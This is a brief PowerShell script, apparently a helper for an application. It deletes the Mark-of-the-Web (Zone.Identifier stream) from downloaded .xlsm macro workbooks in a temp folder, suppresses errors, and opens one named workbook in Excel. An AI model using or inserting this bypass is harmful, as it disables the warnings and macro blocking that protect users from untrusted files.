<#
.SYNOPSIS
    Removes MOTW and opens Excel file
#>

$folderPath = "$env:TEMP\MyAppDownloads"
$excelFiles = Get-ChildItem -Path $folderPath -Filter "*.xlsm" -File

foreach ($file in $excelFiles) {
    $zoneIdStream = "$($file.FullName):Zone.Identifier"
    if (Get-Item -Path $zoneIdStream -ErrorAction SilentlyContinue) {
        try { Remove-Item -Path $zoneIdStream -Force } catch {}
    }
}

Start-Sleep -Seconds 1
Start-Process "excel.exe" -ArgumentList "`"$folderPath\imarc.xlsm`""
exit
